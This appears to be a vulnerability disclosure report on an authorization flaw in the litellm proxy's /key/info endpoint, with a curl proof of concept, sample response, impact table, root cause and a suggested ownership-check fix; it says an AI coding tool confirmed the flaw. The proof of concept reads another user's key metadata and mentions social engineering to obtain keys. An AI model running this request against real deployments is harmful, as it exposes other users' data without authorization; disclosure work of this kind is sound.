# Finding #5 — IDOR on /key/info in litellm proxy

**Target:** BerriAI/litellm
**Version:** 1.82.6
**Date:** March 2026
**CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key
**CVSS:** AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N = **4.3 Medium**
**Status:** Ready to submit

---

## Summary

The `GET /key/info` endpoint allows any authenticated user to retrieve full metadata for **any other user's API key** by supplying the target key in the `key` query parameter. No ownership check is performed — the server returns 200 with the target key's full configuration regardless of who is asking.

---

## Proof of Concept

```bash
# Step 1: Authenticate as User A (regular user)
USER_A_KEY="sk-..."   # your own key

# Step 2: Obtain User B's key identifier (e.g. from /routes enumeration or social engineering)
USER_B_KEY="sk-..."   # another user's key

# Step 3: Read User B's full key metadata using User A's credentials
curl -H "Authorization: Bearer $USER_A_KEY" \
     "http://TARGET:4000/key/info?key=$USER_B_KEY"
```

**Response (HTTP 200 — no error, full data returned):**
```json
{
  "key": "sk-...MASKED...",
  "models": ["gpt-4", "claude-3"],
  "max_budget": 10.0,
  "spend": 3.47,
  "expires": "2026-04-01T00:00:00",
  "user_id": "user_b@company.com",
  "metadata": { "role": "user_b", "team": "engineering" },
  "permissions": { ... },
  "max_parallel_requests": 5
}
```

---

## What is exposed

| Field | Risk |
|-------|------|
| `models` | Attacker learns which models another user is authorized for |
| `max_budget` / `spend` | Reveals financial allocations and usage per user |
| `expires` | Key lifetime — useful for timing attacks |
| `user_id` | User identity / email |
| `metadata` | Any custom org data stored on the key |
| `permissions` | Authorization scope of the target key |

The secret key value itself is masked, but the metadata is sufficient for targeted reconnaissance.

---

## Root Cause

`/key/info` checks authentication (is the requester logged in?) but not authorization (does the requester own the requested key?). The `key` query parameter is trusted without ownership validation.

Expected behavior: a regular user should only be able to query their own key. Admin role should be required to query any key.

---

## Impact

Any authenticated user (including users with minimal permissions, such as a free-tier API key) can:
1. Enumerate budget allocations and spending of other users/teams
2. Discover which models other users are authorized to use
3. Identify user emails and org metadata stored on keys
4. Map the internal user structure of the litellm deployment

---

## Suggested Fix

Add ownership check before returning key info:

```python
@router.get("/key/info")
async def key_info(key: str, user_api_key_dict=Depends(user_api_key_auth)):
    # Only allow if requester is admin OR requesting their own key
    if user_api_key_dict.user_role != "proxy_admin":
        if key != user_api_key_dict.api_key:
            raise HTTPException(status_code=403, detail="Not authorized to view this key")
    ...
```

---

## Verification

Confirmed by QWEN (Qwen Code, aider terminal) on litellm v1.82.6 with PostgreSQL DB connected.
Tested with two independently generated user keys — User A successfully read User B's full key metadata.
